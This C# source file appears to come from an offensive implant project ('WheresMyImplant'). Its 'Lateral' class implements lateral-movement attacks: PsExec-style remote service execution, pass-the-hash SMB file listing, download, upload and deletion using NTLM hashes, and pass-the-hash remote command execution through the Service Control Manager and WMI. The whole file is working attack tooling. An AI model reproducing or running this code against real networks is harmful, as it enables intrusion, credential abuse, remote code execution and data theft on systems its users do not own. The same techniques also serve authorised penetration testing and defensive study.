using System;
using System.Linq;
using System.Text;

namespace WheresMyImplant
{
    public class Lateral
    {
        public static void PSExecCommand(String system, String execute, String isCommand)
        {
            if (!Boolean.TryParse(isCommand, out Boolean comspec))
            {
                comspec = false;
            }

            using (PSExec psexec = new PSExec())
            {
                psexec.Connect(system);
                String command = execute;
                if (comspec)
                {
                    command = String.Format("%COMSPEC% /C start {0}", execute);
                }
                psexec.Create(command);
                psexec.Open();
                psexec.Start();
                psexec.Stop();
            }
        }

        public static void PTHSMBClientList(String uncPath, String domain, String username, String hash)
        {
            using (SMBClient smbClient = new SMBClient())
            {
                String target, share, folder = String.Empty;
                try
                {
                    System.Collections.IEnumerator enumerator = uncPath.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries).GetEnumerator();

                    if (!enumerator.MoveNext())
                    {
                        Console.WriteLine("[-] Invalid UNC Path");
                        return;
                    }
                    target = (String)enumerator.Current;

                    if (!enumerator.MoveNext())
                    {
                        Console.WriteLine("[-] Invalid UNC Path");
                        return;
                    }
                    share = (String)enumerator.Current;

                    StringBuilder sbFolder = new StringBuilder();
                    while (enumerator.MoveNext())
                    {
                        sbFolder.Append((String)enumerator.Current + @"\");
                    }
                    folder = sbFolder.ToString();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                    return;
                }

                if (!smbClient.Connect(target))
                {
                    Console.WriteLine("[-] Unable to Connect");
                    return;
                }

                smbClient.NegotiateSMB();
                smbClient.NegotiateSMB2();
                smbClient.NTLMSSPNegotiate();

                if (!smbClient.Authenticate(domain, username, hash))
                {
                    Console.WriteLine("[-] Login Failed");
                    return;
                }

                try
                {
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
                    smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, share));
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, share));
                    smbClient.CreateRequest(String.Empty);
                    smbClient.InfoRequest();
                    if (!String.IsNullOrEmpty(folder))
                    {
                        smbClient.CreateRequest(folder);
                        smbClient.CloseRequest();
                    }
                    smbClient.FindRequest(folder);
                    smbClient.ParseDirectoryContents();
                    smbClient.CloseRequest();
                    smbClient.DisconnectTree();
                    smbClient.LogoffRequest();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Unhandled Exception Occured");
                    Console.WriteLine("[-] {0}", ex.Message);
                }
            }
        }

        public static void PTHSMBClientGet(String uncPathSource, String destination, String domain, String username, String hash)
        {
            using (SMBClientGet smbClient = new SMBClientGet())
            {
                String target, share, folder, file = String.Empty;
                try
                {
                    String[] path = uncPathSource.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries);
                    var enumerator = path.GetEnumerator();

                    if (!enumerator.MoveNext())
                    {
                        Console.WriteLine("[-] Invalid UNC Path");
                        return;
                    }
                    target = (String)enumerator.Current;

                    if (!enumerator.MoveNext())
                    {
                        Console.WriteLine("[-] Invalid UNC Path");
                        return;
                    }
                    share = (String)enumerator.Current;

                    StringBuilder sbFolder = new StringBuilder();
                    for (Int32 i = 2; i < path.Length - 1; i++)
                        sbFolder.Append(path[i] + @"\");
                    folder = sbFolder.ToString();
                    file = path.Last();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Unhandled Exception Occured");
                    Console.WriteLine("[-] {0}", ex.Message);
                    return;
                }

                if (!smbClient.Connect(target))
                {
                    Console.WriteLine("[-] Unable to Connect");
                    return;
                }

                smbClient.NegotiateSMB();
                smbClient.NegotiateSMB2();
                smbClient.NTLMSSPNegotiate();

                if (!smbClient.Authenticate(domain, username, hash))
                {
                    Console.WriteLine("[-] Login Failed");
                    return;
                }

                try
                {
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
                    smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, share));
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, share));

                    smbClient.CreateRequest(folder + file);
                    smbClient.CloseRequest();
                    smbClient.CreateRequest(folder);
                    smbClient.FindRequest();
                    smbClient.CreateRequest(folder + file);
                    smbClient.ReadRequest();
                    smbClient.CreateRequest(folder + file);
                    smbClient.InfoRequest();
                    smbClient.InfoRequest(destination);
                    smbClient.ReadRequest2();

                    smbClient.CloseRequest();
                    smbClient.DisconnectTree();
                    smbClient.LogoffRequest();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Unhandled Exception Occured");
                    Console.WriteLine("[-] {0}", ex.Message);
                }
            }
        }

        public static void PTHSMBClientPut(String source, String uncPathDestination, String domain, String username, String hash)
        {
            using (SMBClientPut smbClient = new SMBClientPut())
            {
                String target, share, folder, file = String.Empty;
                try
                {
                    String[] path = uncPathDestination.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries);
                    var enumerator = path.GetEnumerator();

                    if (!enumerator.MoveNext())
                    {
                        Console.WriteLine("[-] Invalid UNC Path");
                        return;
                    }
                    target = (String)enumerator.Current;

                    if (!enumerator.MoveNext())
                    {
                        Console.WriteLine("[-] Invalid UNC Path");
                        return;
                    }
                    share = (String)enumerator.Current;

                    StringBuilder sbFolder = new StringBuilder();
                    for (Int32 i = 2; i < path.Length - 1; i++)
                        sbFolder.Append(path[i] + @"\");
                    folder = sbFolder.ToString();
                    file = path.Last();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Unhandled Exception Occured");
                    Console.WriteLine("[-] {0}", ex.Message);
                    return;
                }

                if (!smbClient.Connect(target))
                {
                    Console.WriteLine("[-] Unable to Connect");
                    return;
                }

                smbClient.NegotiateSMB();
                smbClient.NegotiateSMB2();
                smbClient.NTLMSSPNegotiate();

                if (!smbClient.Authenticate(domain, username, hash))
                {
                    Console.WriteLine("[-] Login Failed");
                    return;
                }

                try
                {
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
                    smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, share));
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, share));

                    smbClient.CreateRequest(folder + file, 1);
                    smbClient.CreateRequest(folder + file, 2);

                    smbClient.GetInfoRequest();
                    smbClient.SetInfoRequest(source, folder + file);

                    smbClient.WriteRequest(source);

                    smbClient.CloseRequest();
                    smbClient.DisconnectTree();
                    smbClient.LogoffRequest();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Unhandled Exception Occured");
                    Console.WriteLine("[-] {0}", ex.Message);
                }
            }
        }

        public static void PTHSMBClientDelete(String uncPathDestination, String domain, String username, String hash)
        {
            using (SMBClientDelete smbClient = new SMBClientDelete())
            {
                String target, share, folder, file = String.Empty;
                try
                {
                    String[] path = uncPathDestination.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries);
                    var enumerator = path.GetEnumerator();

                    if (!enumerator.MoveNext())
                    {
                        Console.WriteLine("[-] Invalid UNC Path");
                        return;
                    }
                    target = (String)enumerator.Current;

                    if (!enumerator.MoveNext())
                    {
                        Console.WriteLine("[-] Invalid UNC Path");
                        return;
                    }
                    share = (String)enumerator.Current;

                    StringBuilder sbFolder = new StringBuilder();
                    for (Int32 i = 2; i < path.Length - 1; i++)
                        sbFolder.Append(path[i] + @"\");
                    folder = sbFolder.ToString();
                    file = path.Last();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Unhandled Exception Occured");
                    Console.WriteLine("[-] {0}", ex.Message);
                    return;
                }

                if (!smbClient.Connect(target))
                {
                    Console.WriteLine("[-] Unable to Connect");
                    return;
                }

                smbClient.NegotiateSMB();
                smbClient.NegotiateSMB2();
                smbClient.NTLMSSPNegotiate();

                if (!smbClient.Authenticate(domain, username, hash))
                {
                    Console.WriteLine("[-] Login Failed");
                    return;
                }

                try
                {
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
                    smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, share));
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, share));

                    smbClient.CreateRequest(String.Empty, 1);
                    smbClient.GetInfoRequest();
                    smbClient.CreateRequest(folder + file, 2);
                    smbClient.CloseRequest();
                    smbClient.CreateRequest(String.Empty, 2);
                    smbClient.CloseRequest();
                    smbClient.FindRequest(folder);
                    smbClient.CreateRequest(folder + file, 3);
                    smbClient.SetInfoRequest();

                    smbClient.CloseRequest();
                    smbClient.DisconnectTree();
                    smbClient.LogoffRequest();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Unhandled Exception Occured");
                    Console.WriteLine("[-] {0}", ex.Message);
                }
            }
        }

        public static void PTHSMBExec(String target, String command, String domain, String username, String hash)
        {
            try
            {
                using (SMBExec smbExec = new SMBExec())
                {
                    smbExec.Connect(target);
                    smbExec.NegotiateSMB();
                    smbExec.NegotiateSMB2();
                    smbExec.NTLMSSPNegotiate();
                    if (smbExec.Authenticate(domain, username, hash))
                    {
                        try
                        {
                            smbExec.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
                            smbExec.CreateRequest(new Byte[] { 0x01, 0x00, 0x00, 0x00 });
                            smbExec.RPCBind();
                            smbExec.ReadRequest();
                            smbExec.OpenSCManagerW();
                            smbExec.ReadRequest();
                            smbExec.CheckAccess(command);
                            smbExec.ReadRequest();
                            smbExec.StartServiceW();
                            smbExec.ReadRequest();
                            smbExec.DeleteServiceW();
                            smbExec.ReadRequest();
                            smbExec.CloseServiceHandle();
                            smbExec.CloseRequest();
                            smbExec.DisconnectTree();
                            smbExec.Logoff();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("[-] Unhandled Exception Occured");
                            Console.WriteLine("[-] {0}", ex.Message);
                        }
                    }
                    else
                    {
                        Console.WriteLine("[-] Login Failed");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Unhandled Exception Occured");
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        public static void PTHWMIExec(String target, String command, String domain, String username, String hash)
        {
            try
            {
                using (WMIExec wmiExec = new WMIExec(command))
                {
                    if (wmiExec.ConnectInitiator(target))
                    {
                        wmiExec.InitiateRPC();
                    }

                    if (wmiExec.ConnectWMI())
                    {
                        wmiExec.RPCBind();
                        wmiExec.Authenticate(domain, username, hash);
                        wmiExec.Activator();
                    }

                    if (wmiExec.ConnectRandom())
                    {
                        wmiExec.RPCBindRandom();
                        wmiExec.AuthenticateRandom(domain, username, hash);
                        wmiExec.QueryInterface();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Unhandled Exception Occured");
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }
    }
}